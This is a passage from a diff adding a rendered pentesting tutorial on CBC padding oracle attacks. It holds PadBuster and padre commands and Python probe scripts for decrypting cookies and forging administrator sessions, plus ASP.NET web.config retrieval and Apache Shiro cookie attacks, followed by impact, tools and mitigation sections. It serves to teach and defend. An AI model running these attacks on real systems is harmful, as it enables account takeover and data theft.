+  <a class="anchor" href="#2-decrypting-ciphertext-with-padbuster">#</a>
+</h3>
+<p>PadBuster automates byte-by-byte CBC decryption using the padding oracle.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Decrypt a session cookie (Base64, block size 8)</span>
+</span></span><span style="display:flex;"><span>padbuster http://target.com/index.php <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;RVJDQrwUdTRWJUVUeBKkEA==&#34;</span> <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -encoding <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -cookies <span style="color:#e6db74">&#34;auth=RVJDQrwUdTRWJUVUeBKkEA==&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If the padding error message is known, specify it explicitly</span>
+</span></span><span style="display:flex;"><span>padbuster http://target.com/index.php <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;RVJDQrwUdTRWJUVUeBKkEA==&#34;</span> <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -encoding <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -cookies <span style="color:#e6db74">&#34;auth=RVJDQrwUdTRWJUVUeBKkEA==&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -error <span style="color:#e6db74">&#34;Invalid padding&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hex-encoded ciphertext (block size 16, lowercase hex encoding)</span>
+</span></span><span style="display:flex;"><span>padbuster <span style="color:#e6db74">&#34;http://target.com/echo?cipher=6b664ef0359fe233e021ad36b12d8e32&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;6b664ef0359fe233e021ad36b12d8e32&#34;</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -encoding <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Encoding options: <code>0</code> = Base64, <code>1</code> = lowercase hex, <code>2</code> = uppercase hex, <code>3</code> = .NET UrlToken, <code>4</code> = WebSafe Base64</p>
+<h3 id="3-privilege-escalation-via-cbc-r-forging-arbitrary-plaintext">
+  3. Privilege Escalation via CBC-R (Forging Arbitrary Plaintext)
+  <a class="anchor" href="#3-privilege-escalation-via-cbc-r-forging-arbitrary-plaintext">#</a>
+</h3>
+<p>Once decryption is possible, CBC-R lets the attacker <strong>encrypt</strong> arbitrary plaintext without the key — enabling cookie/session forgery and privilege escalation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Decrypt to confirm current plaintext: &#34;user=regularuser&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Then re-encrypt with forged value: &#34;user=administrator&#34;</span>
+</span></span><span style="display:flex;"><span>padbuster http://target.com/index.php <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;RVJDQrwUdTRWJUVUeBKkEA==&#34;</span> <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -encoding <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -cookies <span style="color:#e6db74">&#34;auth=RVJDQrwUdTRWJUVUeBKkEA==&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -plaintext <span style="color:#e6db74">&#34;user=administrator&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output: new ciphertext that decrypts to &#34;user=administrator&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Submit this as the auth cookie → logged in as administrator</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># padre — modern Go-based tool with auto-fingerprinting</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypt</span>
+</span></span><span style="display:flex;"><span>padre -u <span style="color:#e6db74">&#39;https://target.com/profile&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -cookie <span style="color:#e6db74">&#39;SESS=$&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;Gw3kg8e3ej4ai9wffn/d0uRqKzyaPfM2UFq/8dWmoW4wnyKZhx07Bg==&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encrypt arbitrary plaintext (privilege escalation)</span>
+</span></span><span style="display:flex;"><span>padre -u <span style="color:#e6db74">&#39;https://target.com/profile&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -cookie <span style="color:#e6db74">&#39;SESS=$&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -enc <span style="color:#e6db74">&#39;{&#34;user_id&#34;: 1, &#34;is_admin&#34;: true}&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Submit output cookie → admin access</span>
+</span></span></code></pre></div><h3 id="4-aspnet-viewstate--webresourceaxd-cve-2010-3332">
+  4. ASP.NET ViewState / WebResource.axd (CVE-2010-3332)
+  <a class="anchor" href="#4-aspnet-viewstate--webresourceaxd-cve-2010-3332">#</a>
+</h3>
+<p>ASP.NET leaks padding validity via <code>WebResource.axd</code>: HTTP 500 = invalid padding, HTTP 200/404 = valid. This enables decryption of ViewState and retrieval of <code>web.config</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Identify WebResource.axd ciphertext from page HTML source</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Look for: &lt;script src=&#34;/WebResource.axd?d=&lt;ciphertext&gt;&amp;t=...&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypt the WebResource parameter</span>
+</span></span><span style="display:flex;"><span>padbuster <span style="color:#e6db74">&#34;http://target.com/WebResource.axd?d=CIPHERTEXT&amp;t=TIMESTAMP&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;CIPHERTEXT&#34;</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -encoding <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -noiv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Retrieve web.config (requires .NET 3.5 SP1+)</span>
+</span></span><span style="display:flex;"><span>padbuster <span style="color:#e6db74">&#34;http://target.com/ScriptResource.axd?d=CIPHERTEXT&amp;t=TIMESTAMP&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#34;CIPHERTEXT&#34;</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -encoding <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -plaintext <span style="color:#e6db74">&#34;~/web.config&#34;</span>
+</span></span></code></pre></div><p>Oracle fingerprint:</p>
+<pre tabindex="0"><code>GET /WebResource.axd?d=&lt;valid_ciphertext&gt;   → HTTP 200
+GET /WebResource.axd?d=&lt;modified_ciphertext&gt; → HTTP 500   ← oracle confirmed
+</code></pre><h3 id="5-apache-shiro-rememberme-cookie-cbc-aes-128">
+  5. Apache Shiro &ldquo;RememberMe&rdquo; Cookie (CBC AES-128)
+  <a class="anchor" href="#5-apache-shiro-rememberme-cookie-cbc-aes-128">#</a>
+</h3>
+<p>Apache Shiro ≤ 1.4.1 encrypts the <code>rememberMe</code> cookie with AES-128-CBC, which makes it vulnerable to a padding oracle attack (<strong>CVE-2019-12422</strong>, &ldquo;Shiro-721&rdquo;). Because CBC is used, the attack works <strong>even when the encryption key is unknown or randomly generated</strong> — the attacker uses a valid <code>rememberMe</code> cookie as the oracle prefix, brute-forces the padding to forge a ciphertext that decrypts to a malicious serialized object, and chains it with a Java deserialization gadget for RCE. Fixed in Shiro 1.4.2 (switched to AES-GCM).</p>
+<blockquote>
+<p><strong>Note:</strong> the earlier <em>hardcoded default key</em> issue is a <strong>separate</strong> vulnerability — CVE-2016-4437 (&ldquo;Shiro-550&rdquo;), affecting Shiro ≤ 1.2.4. There, the publicly known key alone enables the deserialization RCE, so no padding oracle is needed. From Shiro 1.2.5 onward the key is randomly generated, which is precisely why Shiro-721 relies on the padding oracle instead.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Detect Shiro by response header (send any rememberMe value to trigger it)</span>
+</span></span><span style="display:flex;"><span>curl -s -I -b <span style="color:#e6db74">&#34;rememberMe=1&#34;</span> https://target.com/ | grep -i <span style="color:#e6db74">&#34;rememberMe=deleteMe&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If rememberMe=deleteMe appears in Set-Cookie → Shiro detected</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Confirm CBC padding oracle</span>
+</span></span><span style="display:flex;"><span>python3 shiro_padding_oracle.py --url https://target.com/login <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --cookie <span style="color:#e6db74">&#34;rememberMe=&lt;captured_cookie&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypt the rememberMe cookie</span>
+</span></span><span style="display:flex;"><span>padbuster https://target.com/ <span style="color:#e6db74">&#34;&lt;rememberMe_value&gt;&#34;</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -encoding <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -cookies <span style="color:#e6db74">&#34;rememberMe=&lt;rememberMe_value&gt;&#34;</span>
+</span></span></code></pre></div><h3 id="6-timing-based-oracle-lucky-thirteen--blind">
+  6. Timing-Based Oracle (Lucky Thirteen / Blind)
+  <a class="anchor" href="#6-timing-based-oracle-lucky-thirteen--blind">#</a>
+</h3>
+<p>When no explicit error is returned, measure response time — valid padding and invalid padding take different amounts of time to process due to MAC computation differences.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> time<span style="color:#f92672">,</span> base64<span style="color:#f92672">,</span> statistics
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">timing_oracle</span>(url, cookie_name, ciphertext):
+</span></span><span style="display:flex;"><span>    times <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):    <span style="color:#75715e"># average over 5 samples to reduce noise</span>
+</span></span><span style="display:flex;"><span>        ct <span style="color:#f92672">=</span> bytearray(base64<span style="color:#f92672">.</span>b64decode(ciphertext))
+</span></span><span style="display:flex;"><span>        ct[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x01</span>    <span style="color:#75715e"># flip last byte</span>
+</span></span><span style="display:flex;"><span>        modified <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(bytes(ct))<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>        requests<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>{cookie_name: modified})
+</span></span><span style="display:flex;"><span>        times<span style="color:#f92672">.</span>append(time<span style="color:#f92672">.</span>time() <span style="color:#f92672">-</span> start)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> statistics<span style="color:#f92672">.</span>mean(times)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Compare against the timing of the *unmodified* (valid) ciphertext:</span>
+</span></span><span style="display:flex;"><span>invalid_time <span style="color:#f92672">=</span> timing_oracle(<span style="color:#e6db74">&#39;https://target.com/&#39;</span>, <span style="color:#e6db74">&#39;session&#39;</span>, <span style="color:#e6db74">&#39;VALID_CIPHERTEXT&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If the modified ciphertext is consistently faster/slower than the valid one → timing oracle</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Average response time with invalid padding: </span><span style="color:#e6db74">{</span>invalid_time<span style="color:#e6db74">:</span><span style="color:#e6db74">.3f</span><span style="color:#e6db74">}</span><span style="color:#e6db74">s&#34;</span>)
+</span></span></code></pre></div><h3 id="test-cases">
+  Test Cases
+  <a class="anchor" href="#test-cases">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Scenario</th>
+<th>Action</th>
+<th>Expected Outcome</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Oracle Identification</td>
+<td>Flip last byte of ciphertext; submit</td>
+<td>Different HTTP status/body/length = oracle confirmed</td>
+</tr>
+<tr>
+<td>Error Message Oracle</td>
+<td>Submit corrupt ciphertext</td>
+<td><code>&quot;Invalid padding&quot;</code> / <code>&quot;Bad data&quot;</code> in response</td>
+</tr>
+<tr>
+<td>Status Code Oracle</td>
+<td>Tamper ciphertext on ASP.NET</td>
+<td>HTTP 200 (valid) vs HTTP 500 (invalid padding)</td>
+</tr>
+<tr>
+<td>Timing Oracle</td>
+<td>Measure response time delta</td>
+<td>Valid vs invalid padding shows measurable timing difference</td>
+</tr>
+<tr>
+<td>Decryption</td>
+<td>Run PadBuster against cookie</td>
+<td>Plaintext of encrypted cookie recovered</td>
+</tr>
+<tr>
+<td>Privilege Escalation</td>
+<td>CBC-R forge <code>user=administrator</code></td>
+<td>New ciphertext decrypts to admin role; session elevated</td>
+</tr>
+<tr>
+<td>Shiro Detection</td>
+<td>Check <code>Set-Cookie</code> for <code>rememberMe=deleteMe</code></td>
+<td>Shiro confirmed; CBC oracle likely present</td>
+</tr>
+</tbody>
+</table>
+<h2 id="detection-techniques-offensive-perspective">
+  Detection Techniques (Offensive Perspective)
+  <a class="anchor" href="#detection-techniques-offensive-perspective">#</a>
+</h2>
+<h3 id="manual-detection--confirming-the-oracle">
+  Manual Detection — Confirming the Oracle
+  <a class="anchor" href="#manual-detection--confirming-the-oracle">#</a>
+</h3>
+<p><strong>Error Message Differential</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Valid ciphertext</span>
+</span></span><span style="display:flex;"><span>curl -s -o /dev/null -w <span style="color:#e6db74">&#34;%{http_code}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -b <span style="color:#e6db74">&#34;session=RVJDQrwUdTRWJUVUeBKkEA==&#34;</span> https://target.com/
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → 200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tampered ciphertext (decode → XOR 0x01 on last byte → re-encode; see §1)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Do NOT edit the Base64 text directly — changing padding chars alters the</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># decoded length and produces a length error rather than a clean byte flip.</span>
+</span></span><span style="display:flex;"><span>curl -s -o /dev/null -w <span style="color:#e6db74">&#34;%{http_code}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -b <span style="color:#e6db74">&#34;session=&lt;modified_token&gt;&#34;</span> https://target.com/
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → 500  ← oracle confirmed</span>
+</span></span></code></pre></div><p><strong>Response Body Keyword Match</strong></p>
+<pre tabindex="0"><code>Valid padding:    HTTP 200 / &#34;Welcome&#34; / redirect to /dashboard
+Invalid padding:  HTTP 500 / &#34;Invalid padding&#34; / &#34;Decryption error&#34; / &#34;Bad data&#34;
+                  &#34;CryptographicException&#34; / &#34;PaddingException&#34; / &#34;EVP_DecryptFinal&#34;
+</code></pre><p><strong>Response Length Delta</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Compare content length between valid and tampered ciphertext</span>
+</span></span><span style="display:flex;"><span>valid_len<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -b <span style="color:#e6db74">&#34;session=VALID&#34;</span> https://target.com/ | wc -c<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>tampered_len<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -b <span style="color:#e6db74">&#34;session=TAMPERED&#34;</span> https://target.com/ | wc -c<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Valid: </span>$valid_len<span style="color:#e6db74"> | Tampered: </span>$tampered_len<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Different lengths = oracle confirmed</span>
+</span></span></code></pre></div><p><strong>Block Boundary Testing</strong></p>
+<p>CBC block size is 8 or 16 bytes. Confirm by observing response changes at multiples:</p>
+<pre tabindex="0"><code>Ciphertext length 8  → modify byte 8  → error
+Ciphertext length 16 → modify byte 16 → error
+If errors only at block boundaries → 8-byte blocks
+If errors at 16-byte boundaries → 16-byte blocks (AES)
+</code></pre><h3 id="automated-detection">
+  Automated Detection
+  <a class="anchor" href="#automated-detection">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># padre — auto-fingerprints oracle and attempts decryption</span>
+</span></span><span style="display:flex;"><span>padre -u <span style="color:#e6db74">&#39;https://target.com/page&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -cookie <span style="color:#e6db74">&#39;auth=$&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;ENCRYPTED_COOKIE_VALUE&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># padre automatically detects valid vs invalid padding responses</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and reports if a padding oracle is exploitable</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># PadBuster auto-analysis mode — samples all response types</span>
+</span></span><span style="display:flex;"><span>padbuster https://target.com/page <span style="color:#e6db74">&#34;CIPHERTEXT&#34;</span> <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -encoding <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -cookies <span style="color:#e6db74">&#34;auth=CIPHERTEXT&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PadBuster presents response analysis table:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Response 1: HTTP 200, Length 4821  ← valid padding</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Response 2: HTTP 500, Length 312   ← invalid padding</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Confirm ID: 2 → attack begins</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Custom oracle probe — test all 256 last-byte values, map responses</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://target.com/&#39;</span>
+</span></span><span style="display:flex;"><span>cookie_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;session&#39;</span>
+</span></span><span style="display:flex;"><span>valid_ct <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#39;RVJDQrwUdTRWJUVUeBKkEA==&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>results <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>    ct <span style="color:#f92672">=</span> bytearray(valid_ct)
+</span></span><span style="display:flex;"><span>    ct[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> i
+</span></span><span style="display:flex;"><span>    modified <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(bytes(ct))<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>{cookie_name: modified})
+</span></span><span style="display:flex;"><span>    results[i] <span style="color:#f92672">=</span> (r<span style="color:#f92672">.</span>status_code, len(r<span style="color:#f92672">.</span>content))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Count distinct response signatures</span>
+</span></span><span style="display:flex;"><span>signatures <span style="color:#f92672">=</span> set(results<span style="color:#f92672">.</span>values())
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Distinct responses: </span><span style="color:#e6db74">{</span>len(signatures)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1 distinct response = no oracle</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2 distinct responses = oracle confirmed (valid vs invalid padding)</span>
+</span></span></code></pre></div><h2 id="impact">
+  Impact
+  <a class="anchor" href="#impact">#</a>
+</h2>
+<ul>
+<li><strong>Full Plaintext Recovery</strong> — Decrypt any ciphertext intercepted in transit or extracted from cookies/tokens without the key</li>
+<li><strong>Session Forgery &amp; Account Takeover</strong> — Decrypt session cookie → modify role/user field → re-encrypt → submit as valid session</li>
+<li><strong>Privilege Escalation</strong> — CBC-R encryption of arbitrary plaintext (<code>user=admin</code>, <code>is_admin=true</code>) without key knowledge</li>
+<li><strong>Sensitive Data Exposure</strong> — Decrypt encrypted ViewState, form fields, or API tokens revealing internal application state and PII</li>
+<li><strong>File Retrieval (ASP.NET)</strong> — CVE-2010-3332 enables reading <code>web.config</code>, leaking <code>machineKey</code>, database credentials, and connection strings</li>
+<li><strong>RCE via Deserialization Chain</strong> — Apache Shiro: padding oracle decryption + Java deserialization gadget chain → remote code execution</li>
+</ul>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PadBuster</td>
+<td>Perl — automated CBC padding oracle decryption and plaintext encryption</td>
+</tr>
+<tr>
+<td>padre</td>
+<td>Go — fast modern padding oracle exploiter with auto-fingerprinting</td>
+</tr>
+<tr>
+<td>python-paddingoracle</td>
+<td>Python API — customizable oracle implementation for non-HTTP / unique encoding scenarios</td>
+</tr>
+<tr>
+<td>Burp Suite (Intruder)</td>
+<td>Manual byte-by-byte ciphertext manipulation and response comparison</td>
+</tr>
+<tr>
+<td>POET</td>
+<td>Python padding oracle exploitation tool</td>
+</tr>
+<tr>
+<td>testssl.sh</td>
+<td>Detect CBC ciphersuites and POODLE/Lucky13 vulnerability in TLS</td>
+</tr>
+<tr>
+<td>Padding Oracle Hunter</td>
+<td>Burp Suite extension (BApp Store) - GUI-based detection and exploitation of PKCS#7 CBC and PKCS#1 v1.5 RSA padding oracles; requires Jython</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mitigation--prevention">
+  Mitigation &amp; Prevention
+  <a class="anchor" href="#mitigation--prevention">#</a>
+</h2>
+<ol>
+<li><strong>Use Authenticated Encryption (AEAD)</strong> — Replace AES-CBC with AES-GCM or ChaCha20-Poly1305; AEAD verifies integrity before decryption - no padding oracle possible. Use high-level libraries rather than raw cipher primitives:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>   <span style="color:#75715e">// PHP — XSalsa20-Poly1305 via libsodium (built-in since PHP 7.2)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   $key   <span style="color:#f92672">=</span> <span style="color:#a6e22e">sodium_crypto_secretbox_keygen</span>();            <span style="color:#75715e">// 32-byte random key
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   $nonce <span style="color:#f92672">=</span> <span style="color:#a6e22e">random_bytes</span>(<span style="color:#a6e22e">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES</span>); <span style="color:#75715e">// 24-byte nonce
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   $ciphertext <span style="color:#f92672">=</span> <span style="color:#a6e22e">sodium_crypto_secretbox</span>($plaintext, $nonce, $key);
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// Decrypt + verify in one call:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   $plaintext  <span style="color:#f92672">=</span> <span style="color:#a6e22e">sodium_crypto_secretbox_open</span>($ciphertext, $nonce, $key);
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> ($plaintext <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) { <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Decryption failed&#34;</span>); }
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#75715e"># Python — AES-128-CBC + HMAC-SHA256 (authenticated; safe against padding oracles)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">from</span> cryptography.fernet <span style="color:#f92672">import</span> Fernet
+</span></span><span style="display:flex;"><span>   key   <span style="color:#f92672">=</span> Fernet<span style="color:#f92672">.</span>generate_key()
+</span></span><span style="display:flex;"><span>   f     <span style="color:#f92672">=</span> Fernet(key)
+</span></span><span style="display:flex;"><span>   token <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>encrypt(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;plaintext&#34;</span>)       <span style="color:#75715e"># encrypt + authenticate</span>
